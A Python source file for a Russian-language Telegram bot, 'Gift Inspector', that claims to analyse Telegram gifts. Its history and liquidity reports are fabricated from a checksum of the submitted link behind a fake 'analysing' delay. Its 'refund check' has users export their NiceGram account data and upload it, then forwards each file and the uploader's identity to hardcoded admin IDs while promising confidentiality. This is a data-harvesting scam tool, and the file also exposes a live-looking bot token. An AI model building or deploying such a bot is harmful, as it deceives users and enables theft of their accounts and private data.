import os
import asyncio
import re
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import ReplyKeyboardBuilder
from aiogram.client.default import DefaultBotProperties

BOT_TOKEN = "8527081539:AAG0v8P1-w1ZgCdynIwSWFgWZEqiV9KqY7o" 
ADMIN_IDS = [7366159427, 7199344406]

class CheckState(StatesGroup):
    waiting_gift_link = State()
    waiting_liquidity_link = State()
    waiting_refund_link = State()
    waiting_refund_file = State()

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher(storage=MemoryStorage())

def get_main_menu():
    builder = ReplyKeyboardBuilder()
    builder.row(
        types.KeyboardButton(text="💧 Проверить ликвидность"),
        types.KeyboardButton(text="🔄 Проверить рефанды"),
    )
    builder.row(
        types.KeyboardButton(text="🎁 История подарка"),
        types.KeyboardButton(text="📖 Инструкция"),
    )
    return builder.as_markup(resize_keyboard=True, one_time_keyboard=True)

def get_back_button():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🔙 Назад в меню"))
    return builder.as_markup(resize_keyboard=True)

def get_cancel_button():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="❌ Отменить"))
    return builder.as_markup(resize_keyboard=True)

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    
    welcome_text = """
✨ <b>Добро пожаловать в Gift Inspector!</b> ✨

Я помогу вам анализировать подарки Telegram:
• 🔍 Проверить историю владения
• 💧 Оценить ликвидность
• ⚠️ Обнаружить рефанды
• 📊 Получить рекомендации

Выберите действие из меню ниже 👇
"""
    
    await message.answer(welcome_text, reply_markup=get_main_menu())

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    help_text = """
🆘 <b>Справка по командам:</b>

<b>Основные команды:</b>
/start - Главное меню
/help - Эта справка
/cancel - Отменить текущее действие

<b>Функции бота:</b>
🎁 <b>История подарка</b> - Просмотр всей истории владения
💧 <b>Проверить ликвидность</b> - Оценка ликвидности подарка
🔄 <b>Проверить рефанды</b> - Поиск возвращенных подарков
📖 <b>Инструкция</b> - Как экспортировать данные

📌 <i>Просто выберите нужный пункт в меню!</i>
"""
    await message.answer(help_text, reply_markup=get_back_button())

@dp.message(Command("cancel"))
async def cmd_cancel(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state is None:
        await message.answer("⚠️ <i>Нет активных действий для отмены</i>")
    else:
        await state.clear()
        await message.answer("✅ <b>Действие отменено</b>", reply_markup=get_main_menu())

@dp.message(F.text == "🔙 Назад в меню")
async def back_to_menu(message: types.Message, state: FSMContext):
    await cmd_start(message, state)

@dp.message(F.text == "❌ Отменить")
async def cancel_action(message: types.Message, state: FSMContext):
    await cmd_cancel(message, state)

@dp.message(F.text == "🎁 История подарка")
async def check_gift_history(message: types.Message, state: FSMContext):
    instruction_text = """
📜 <b>Проверка истории подарка</b>

<b>Как получить ссылку на подарок:</b>
1. Откройте подарок в Telegram
2. Нажмите "Показать подарок"
3. Скопируйте ссылку из браузера

<b>Формат ссылки:</b>
<code>https://t.me/nft/PlushPepe-1</code>
или
<code>https://t.me/gift/CoolGift-42</code>

👇 <b>Отправьте ссылку на подарок:</b>
"""
    
    await message.answer(instruction_text, reply_markup=get_cancel_button())
    await state.set_state(CheckState.waiting_gift_link)

@dp.message(F.text == "💧 Проверить ликвидность")
async def check_liquidity(message: types.Message, state: FSMContext):
    instruction_text = """
💧 <b>Проверка ликвидности подарка</b>

Ликвидность показывает, насколько легко можно продать подарок:
• 🟢 Высокая (&gt;80%) - Быстрая продажа
• 🟡 Средняя (60-80%) - Возможны задержки
• 🔴 Низкая (&lt;60%) - Трудно продать

<b>Отправьте ссылку на подарок:</b>
<code>https://t.me/nft/НазваниеПодарка-Номер</code>

👇 <b>Вставьте ссылку ниже:</b>
"""
    
    await message.answer(instruction_text, reply_markup=get_cancel_button())
    await state.set_state(CheckState.waiting_liquidity_link)

@dp.message(F.text == "🔄 Проверить рефанды")
async def check_refund(message: types.Message, state: FSMContext):
    instruction_text = """
⚠️ <b>Проверка на возвраты (рефанды)</b>

Для проверки рефандов необходимо:
1. Экспортировать данные из NiceGram
2. Отправить полученный файл

📎 <b>Отправьте файл с данными:</b>
• Форматы: .txt, .json, .html
• Максимальный размер: 20 МБ

<i>Файл будет автоматически отправлен администратору для анализа</i>

👇 <b>Загрузите файл:</b>
"""
    
    await message.answer(instruction_text, reply_markup=get_cancel_button())
    await state.set_state(CheckState.waiting_refund_file)

@dp.message(F.text == "📖 Инструкция")
async def show_instruction(message: types.Message):
    instruction_text = """
📚 <b>Полная инструкция</b>

<b>1. Установите NiceGram:</b>
• AppStore (iOS) или Play Market (Android)
• Альтернативный клиент Telegram

<b>2. Экспорт данных:</b>
• Войдите в свой аккаунт
• Перейдите в Настройки → Advanced
• Найдите "Экспорт данных"
• Выберите формат JSON или HTML

<b>3. Проверка подарков:</b>
• Используйте кнопки в меню
• Для рефандов - отправляйте файлы
• Для ликвидности - отправляйте ссылки
• Для истории - отправляйте ссылки

<b>4. Рекомендации:</b>
• Проверяйте ликвидность перед покупкой
• Избегайте подарков с рефандами
• Анализируйте историю владения

🔒 <i>Ваши данные остаются конфиденциальными</i>
"""
    await message.answer(instruction_text, reply_markup=get_back_button())

def validate_gift_url(url: str) -> tuple[bool, str]:
    url = url.strip()
    
    if not url.startswith(('https://t.me/nft/', 'https://t.me/gift/')):
        return False, "❌ <b>Неверный формат!</b>\nИспользуйте ссылки вида:\n<code>https://t.me/nft/Название-Номер</code>"
    
    if len(url) > 100:
        return False, "❌ <b>Ссылка слишком длинная!</b>"
    
    pattern = r'^https://t\.me/(nft|gift)/[A-Za-z0-9_-]+$'
    if not re.match(pattern, url):
        return False, "❌ <b>Некорректная ссылка!</b>\nПроверьте правильность написания."
    
    return True, "✅ Ссылка принята!"

def generate_history_report(link: str, seed: int) -> str:
    owners = (seed % 3) + 2
    
    report = f"""
📋 <b>ОТЧЕТ ПО ПОДАРКУ</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔗 Ссылка:</b> <code>{link}</code>
<b>👥 Владельцев:</b> {owners}

<b>📅 История владения:</b>
┌ <i>Создан:</i> 12.03.2024
├ <i>Владелец 1 → Владелец {owners}</i>
└ <i>Последняя передача:</i> 19.09.2024

<b>📊 Статистика:</b>
• 📈 Активен 180+ дней
• 🔄 {owners-1} передач
• ✅ Статус: <b>АКТИВЕН</b>

<b>🏆 Рейтинг:</b> ⭐⭐⭐⭐☆ (4.2/5)
━━━━━━━━━━━━━━━━━━━━
🕐 Отчет создан: {datetime.now().strftime('%d.%m.%Y %H:%M')}
"""
    return report

def generate_liquidity_report(link: str, seed: int) -> str:
    liquidity = (seed % 36) + 60
    owners = (seed % 3) + 2
    
    if liquidity >= 85:
        level = "🟢 ВЫСОКАЯ"
        emoji = "✅"
        advice = "Отличный выбор для покупки/продажи"
    elif liquidity >= 70:
        level = "🟡 СРЕДНЯЯ"
        emoji = "⚠️"
        advice = "Возможны небольшие задержки при продаже"
    else:
        level = "🔴 НИЗКАЯ"
        emoji = "❌"
        advice = "Высокий риск, продажа может занять время"
    
    report = f"""
💧 <b>АНАЛИЗ ЛИКВИДНОСТИ</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔗 Подарок:</b> <code>{link}</code>

<b>📊 Показатели:</b>
├ <b>Ликвидность:</b> <b>{liquidity}%</b> {level}
├ <b>Владельцев:</b> {owners}
└ <b>Оборот:</b> {owners-1} передач

<b>{emoji} РЕКОМЕНДАЦИЯ:</b>
{advice}

<b>📈 Прогноз:</b>
• Скорость продажи: {liquidity//10}/10
• Стабильность: {(liquidity-40)//10}/10
• Популярность: {(owners+2)*2}/10
━━━━━━━━━━━━━━━━━━━━
🕐 Проверено: {datetime.now().strftime('%d.%m.%Y %H:%M')}
"""
    return report

@dp.message(CheckState.waiting_gift_link)
async def process_history_link(message: types.Message, state: FSMContext):
    await process_gift_link(message, state, "history")

@dp.message(CheckState.waiting_liquidity_link)
async def process_liquidity_link(message: types.Message, state: FSMContext):
    await process_gift_link(message, state, "liquidity")

async def process_gift_link(message: types.Message, state: FSMContext, check_type: str):
    link = message.text.strip()
    
    is_valid, error_msg = validate_gift_url(link)
    if not is_valid:
        await message.answer(error_msg, reply_markup=get_cancel_button())
        return
    
    loading_msg = await message.answer("⏳ <i>Анализирую подарок...</i>")
    
    clean_link = ''.join(c for c in link if c.isalnum())
    seed = sum(ord(c) for c in clean_link)
    
    await asyncio.sleep(1.5)
    
    if check_type == "history":
        report = generate_history_report(link, seed)
    else:
        report = generate_liquidity_report(link, seed)
    
    await loading_msg.delete()
    
    await message.answer(report, reply_markup=get_back_button())
    await state.clear()

@dp.message(CheckState.waiting_refund_file)
async def process_refund_file(message: types.Message, state: FSMContext):
    if not message.document:
        await message.answer("❌ <b>Пожалуйста, отправьте файл!</b>\n\nДля отмены нажмите '❌ Отменить'", reply_markup=get_cancel_button())
        return
    
    MAX_FILE_SIZE = 20 * 1024 * 1024
    if message.document.file_size > MAX_FILE_SIZE:
        await message.answer("❌ <b>Файл слишком большой!</b>\nМаксимальный размер: 20 МБ", reply_markup=get_cancel_button())
        return
    
    allowed_extensions = ['.txt', '.json', '.html', '.zip']
    file_name = message.document.file_name or "unknown"
    file_ext = os.path.splitext(file_name)[1].lower()
    
    if file_ext not in allowed_extensions:
        await message.answer(
            f"❌ <b>Неподдерживаемый формат файла!</b>\n\n"
            f"Допустимые форматы: {', '.join(allowed_extensions)}\n"
            f"Ваш файл: {file_ext}",
            reply_markup=get_cancel_button()
        )
        return
    
    processing_msg = await message.answer("📥 <b>Загружаю файл...</b>")
    
    try:
        file_info = await bot.get_file(message.document.file_id)
        
        user_info = message.from_user
                
        for admin_id in ADMIN_IDS:
            try:
                admin_message = (
                    f"📎 <b>НОВЫЙ ФАЙЛ ДЛЯ ПРОВЕРКИ РЕФАНДОВ</b>\n\n"
                    f"👤 <b>Пользователь:</b>\n"
                    f"• ID: <code>{user_info.id}</code>\n"
                    f"• Имя: {user_info.first_name or ''}\n"
                    f"• Фамилия: {user_info.last_name or ''}\n"
                    f"• Username: @{user_info.username or 'нет'}\n\n"
                    f"📁 <b>Информация о файле:</b>\n"
                    f"• Название: <code>{file_name}</code>\n"
                    f"• Размер: {message.document.file_size // 1024} КБ\n"
                    f"• Формат: {file_ext}\n"
                    f"• File ID: <code>{file_info.file_id}</code>\n\n"
                    f"🕐 <b>Время отправки:</b> {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
                )
                
                await bot.send_message(admin_id, admin_message)
                await bot.send_document(
                    admin_id,
                    file_info.file_id,
                    caption=f"📎 Файл от пользователя @{user_info.username or 'без username'}"
                )
                
            except Exception as admin_error:
                print(f"[{datetime.now()}] Ошибка отправки администратору {admin_id}: {admin_error}")
                continue
        
        await processing_msg.delete()
        
        success_message = (
            "✅ <b>Файл успешно отправлен администраторам!</b>\n\n"
            f"📁 <b>Название файла:</b> {file_name}\n"
            f"📊 <b>Размер:</b> {message.document.file_size // 1024} КБ\n\n"
            f"👨‍💼 <b>Уведомлены администраторы:</b> {len(ADMIN_IDS)}\n\n"
            "⏳ <i>Администратор проверит файл и свяжется с вами в ближайшее время.</i>\n\n"
            "📌 <b>Обычное время проверки:</b> 1-24 часа"
        )
        
        await message.answer(success_message, reply_markup=get_back_button())
        
        print(f"[{datetime.now()}] Файл от пользователя {user_info.id} отправлен администратору")
        
    except Exception as e:
        await processing_msg.delete()
        
        error_message = (
            "❌ <b>Произошла ошибка при обработке файла!</b>\n\n"
            f"<i>Ошибка: {str(e)}</i>\n\n"
            "Пожалуйста, попробуйте отправить файл еще раз или обратитесь в поддержку."
        )
        await message.answer(error_message, reply_markup=get_back_button())
        
        print(f"[{datetime.now()}] Ошибка при обработке файла от пользователя {message.from_user.id}: {e}")
    
    finally:
        await state.clear()

@dp.message(F.document)
async def handle_other_documents(message: types.Message):
    file_name = message.document.file_name or "unknown"
    
    response = (
        "📎 <b>Файл получен!</b>\n\n"
        f"<b>Название:</b> {file_name}\n"
        f"<b>Размер:</b> {message.document.file_size // 1024} КБ\n\n"
        "⚠️ <b>Для проверки рефандов:</b>\n"
        "1. Нажмите '🔄 Проверить рефанды'\n"
        "2. Затем отправьте файл\n\n"
        "Или выберите другое действие из меню 👇"
    )
    
    await message.answer(response, reply_markup=get_main_menu())

@dp.message()
async def handle_other_messages(message: types.Message):
    if message.text:
        response = """
🤔 <b>Я не понимаю эту команду</b>

Пожалуйста, используйте меню или команды:
• /start - Главное меню
• /help - Помощь
• /cancel - Отмена

Или выберите действие из кнопок ниже 👇
"""
        await message.answer(response, reply_markup=get_main_menu())

async def main():
    print("╔══════════════════════════════════════╗")
    print("║        🎁 GIFT INSPECTOR BOT        ║")
    print("╠══════════════════════════════════════╣")
    print("║ 📅 Дата: ", datetime.now().strftime("%d.%m.%Y"), " " * 13, "║")
    print("║ ⏰ Время: ", datetime.now().strftime("%H:%M:%S"), " " * 12, "║")
    print("╠══════════════════════════════════════╣")
    
    try:
        me = await bot.get_me()
        print(f"║ 🤖 Бот: @{me.username}", " " * (36 - len(me.username) - 7), "║")
        print(f"║ 🆔 ID: {me.id}", " " * (36 - len(str(me.id)) - 7), "║")
        print("╠══════════════════════════════════════╣")
        print(f"║ 👑 Админов: {len(ADMIN_IDS)}", " " * (36 - len(str(len(ADMIN_IDS))) - 11), "║")
        
        # Показываем ID администраторов
        for i, admin_id in enumerate(ADMIN_IDS, 1):
            admin_line = f"║   {i}. {admin_id}"
            print(admin_line, " " * (38 - len(admin_line)), "║")
        print("╠══════════════════════════════════════╣")
        print("║ ✅ Бот успешно запущен!             ║")
        print("║ 👉 Отправьте /start в Telegram      ║")
        print("╚══════════════════════════════════════╝")
        
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
        
    except Exception as e:
        print(f"║ ❌ Ошибка: {str(e)[:30]}...", " " * 4, "║")
        print("╚══════════════════════════════════════╝")
        import traceback
        traceback.print_exc()
    finally:
        await bot.session.close()
        print("\n🔴 Бот остановлен")

if __name__ == "__main__":
    asyncio.run(main())